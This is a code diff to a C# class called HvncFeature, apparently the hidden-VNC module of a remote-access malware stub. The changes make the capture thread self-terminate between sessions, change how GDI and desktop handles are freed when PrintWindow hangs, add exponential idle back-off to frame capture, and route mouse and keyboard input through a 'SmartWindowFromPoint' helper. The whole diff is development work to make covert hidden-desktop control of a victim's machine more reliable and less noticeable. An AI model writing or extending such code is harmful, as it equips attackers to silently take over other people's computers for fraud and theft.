@@ -339,6 +339,10 @@ internal static class HvncFeature
     // Dirty-frame detection — skip encode+send when composite is unchanged
     private static ulong _lastCompHash;
     private static bool  _compositeUnchanged;
+    // Consecutive unchanged frames — used for exponential idle back-off
+    private static int   _unchangedStreak;
+    // Incremented each Start() so orphan threads (left alive after a PrintWindow hang) self-terminate
+    private static volatile int _sessionId;
 
 
     // ── Public API ────────────────────────────────────────────────────────────
@@ -378,12 +382,14 @@ internal static class HvncFeature
         // Try H264 encoder — graceful fallback to JPEG if MF unavailable
         _h264Enc = H264Encoder.Create(_canvasW, _canvasH, cfg.Fps);
         Interlocked.Exchange(ref _pendingAcks, 8);
+        _unchangedStreak = 0;
+        int mySession = Interlocked.Increment(ref _sessionId);
         _running = true;
         _captureThread = new Thread(CaptureLoop)
         {
             IsBackground = true, Name = "HvncCapture", Priority = ThreadPriority.AboveNormal
         };
-        _captureThread.Start();
+        _captureThread.Start(mySession);
     }
 
     public static void Stop()
@@ -394,18 +400,23 @@ internal static class HvncFeature
         bool threadExited = _captureThread?.Join(5000) ?? true;
         _captureThread = null;
 
-        // CaptureLoop frees its own resources on exit. Only clean up here if the thread
-        // actually exited — calling Free* while the thread still runs causes GDI double-free.
         if (threadExited)
         {
+            // Thread exited cleanly — free all GDI resources in safe order.
             FreeWinCache();
             FreeComposite();
             if (_compHdcRef != 0) { ReleaseDC(0, _compHdcRef); _compHdcRef = 0; }
+            if (_hDesktop  != 0)  { CloseDesktop(_hDesktop);   _hDesktop  = 0; }
+            if (_gdipToken != 0)  { GdiplusShutdown(_gdipToken); _gdipToken = 0; }
+            _h264Enc?.Dispose(); _h264Enc = null;
         }
-
-        if (_hDesktop != 0) { CloseDesktop(_hDesktop); _hDesktop = 0; }
-        if (_gdipToken != 0) { GdiplusShutdown(_gdipToken); _gdipToken = 0; }
-        _h264Enc?.Dispose(); _h264Enc = null;
+        else
+        {
+            // PrintWindow hung for >5 s — leak GDI handles rather than calling
+            // CloseDesktop/GdiplusShutdown under a live thread (UB / crash risk).
+            // Zero out the fields so Start() allocates fresh resources next session.
+            _hDesktop = 0; _gdipToken = 0; _h264Enc = null; _compHdcRef = 0;
+        }
 
         _movingWindow    = false;
         _movingHwnd      = 0;
@@ -530,8 +541,9 @@ internal static class HvncFeature
 
     // ── Capture loop ──────────────────────────────────────────────────────────
 
-    private static void CaptureLoop()
+    private static void CaptureLoop(object? arg)
     {
+        int mySession = (int)arg!;
         // Bind this OS thread to the hidden desktop for the entire session
         if (_hDesktop != 0) SetThreadDesktop(_hDesktop);
 
@@ -544,7 +556,7 @@ internal static class HvncFeature
         StubLog.Info("[HVNC] CaptureLoop started");
         try
         {
-            while (_running)
+            while (_running && _sessionId == mySession)
             {
                 // Always drain input first — never let a pending ack block input processing.
                 // This is critical for double-click timing: mouse events must be processed
@@ -557,7 +569,7 @@ internal static class HvncFeature
                 if (_pendingAcks <= 0 && !inDrag)
                 {
                     _ackWake.Wait(50);
-                    if (!_running) break;
+                    if (!_running || _sessionId != mySession) break;
                     continue; // loop back to drain input before checking acks again
                 }
 
@@ -578,12 +590,15 @@ internal static class HvncFeature
                         {
                             if (_compositeUnchanged && !inDrag)
                             {
-                                // No change — return the ack budget and wait one frame before re-checking
+                                _unchangedStreak++;
                                 Interlocked.Increment(ref _pendingAcks);
-                                Thread.Sleep(_fpsDelay);
+                                // Exponential back-off: 1×→2×→4×→8× fpsDelay (caps at 8×).
+                                // Cuts CaptureComposite/PrintWindow frequency when screen is idle.
+                                Thread.Sleep(_fpsDelay * Math.Min(1 << Math.Min(_unchangedStreak - 1, 3), 8));
                             }
                             else
                             {
+                                _unchangedStreak = 0;
                                 var h264 = _h264Enc.Encode(_compBits, _canvasW * 4);
                                 if (h264 != null)
                                 {
@@ -603,11 +618,13 @@ internal static class HvncFeature
                         {
                             if (_compositeUnchanged && !inDrag)
                             {
+                                _unchangedStreak++;
                                 Interlocked.Increment(ref _pendingAcks);
-                                Thread.Sleep(_fpsDelay);
+                                Thread.Sleep(_fpsDelay * Math.Min(1 << Math.Min(_unchangedStreak - 1, 3), 8));
                             }
                             else
                             {
+                                _unchangedStreak = 0;
                                 var jpeg = EncodeJpeg(_compBits, _canvasW, _canvasH, _canvasW * 4);
                                 if (jpeg != null)
                                     _send?.Invoke((int)PacketType.HvncFrame,
@@ -1228,7 +1245,7 @@ internal static class HvncFeature
 
     private static void HandleMouseWheel(int delta)
     {
-        nint hwnd = WindowFromPoint(new POINT { x = _curX, y = _curY });
+        nint hwnd = SmartWindowFromPoint(new POINT { x = _curX, y = _curY });
         if (hwnd == 0) hwnd = _lastHwnd;
         if (hwnd == 0) return;
         nint wp = (nint)(((uint)(short)delta << 16) & 0xFFFF0000);
@@ -1246,7 +1263,7 @@ internal static class HvncFeature
             case 0x14: if (down) _capsLock = !_capsLock; break;         // CapsLock toggle
         }
 
-        nint hwnd = WindowFromPoint(new POINT { x = _curX, y = _curY });
+        nint hwnd = SmartWindowFromPoint(new POINT { x = _curX, y = _curY });
         if (hwnd == 0) hwnd = _lastHwnd;
         if (hwnd == 0) hwnd = GetForegroundWindow();
         if (hwnd == 0) return;
